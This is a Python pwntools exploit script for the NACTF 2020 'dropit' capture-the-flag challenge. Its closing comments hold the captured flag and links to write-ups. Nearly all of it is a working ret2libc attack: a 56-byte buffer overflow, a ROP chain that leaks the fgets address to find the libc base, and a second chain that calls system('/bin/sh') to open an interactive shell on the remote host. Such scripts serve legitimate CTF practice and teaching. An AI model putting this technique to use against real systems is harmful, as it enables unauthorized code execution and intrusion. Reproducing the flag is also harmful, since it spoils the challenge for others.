from pwn import *

p = remote('challenges.ctfd.io' , 30261)
#p = process('./dropit') 
binary = ELF('dropit' , checksec = False)
rop = ROP(binary)

OFFSET = cyclic(56) # found we overflow script

POP_RDI_ROP = rop.find_gadget(['pop rdi'])[0]
log.info("pop rdi gadget : " + hex(POP_RDI_ROP)) 

RET_ROP = rop.find_gadget(['ret'])[0]
log.info("ret rop gadget : " + hex(RET_ROP))

#globat offset table of the function we are gonna leak

FGETS_GOT = binary.got['fgets']
log.info("fgets got : " + str(FGETS_GOT))

#the procedure linkage table address of the function we are gonna leak

FGETS_PLT = binary.symbols['fgets']
log.info("fgets plt : " + str(FGETS_PLT))

#the procedure linkage table address of the function puts
PUTS_PLT = binary.symbols['puts']
log.info("puts plt : " + str(PUTS_PLT))

PUTS_GOT = binary.got['puts']
log.info("puts got : " + str(PUTS_GOT))

#main plt
MAIN_PLT = binary.symbols['main']
log.info("main plt : " + str(MAIN_PLT))

#rop chain

#rop_chain1 = OFFSET + p64(RET_ROP) + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(FGETS_PLT) + p64(MAIN_PLT) # doesnt work
#rop_chain1 = OFFSET + p64(RET_ROP) + p64(POP_RDI_ROP) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) # also works
rop_chain1 = OFFSET + p64(RET_ROP) + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) # also works
#rop_chain1 = OFFSET + p64(POP_RDI_ROP) + p64(FGETS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT) # this doesnt work EOF when doing the last exploit
p.recvuntil('?\n')
p.sendline(rop_chain1)

leak = int(hex(u64(p.recvuntil('\n').ljust(8, b'\x00')))[3:], 16)
log.info("leaked address : " + hex(leak))

# now that we know the lib adresse and found it and download it from https://libc.rip/ we can start the second part of the rop attack

libc = ELF('libc6_2.32-0ubuntu3_amd64.so', checksec = False)
libc.address = leak - libc.symbols['fgets']
log.info("libc base address : " + hex(libc.address))

SHELL_ADDRESS = next(libc.search(b'/bin/sh'))
log.info("shell address : " + hex(SHELL_ADDRESS))
SYSTEM_ADDRESS = libc.symbols['system']
log.info("system address : " + hex(SYSTEM_ADDRESS))

#create new rop chain
rop_chain2 = cyclic(56) + p64(POP_RDI_ROP) + p64(SHELL_ADDRESS) + p64(SYSTEM_ADDRESS)

p.sendline(rop_chain2)
p.interactive()


# nactf{r0p_y0ur_w4y_t0_v1ct0ry_698jB84iO4OH1cUe}

# https://blackbeard666.github.io/pwn_exhibit/content/2020_CTF/NACTF/pwn_dropit.html
#https://book.hacktricks.xyz/misc/basic-python/rop-pwn-template
# https://github.com/MOCSCTF/CTF-Write-UP/tree/master/Pwn/NACTF2020%20-%20dROPit
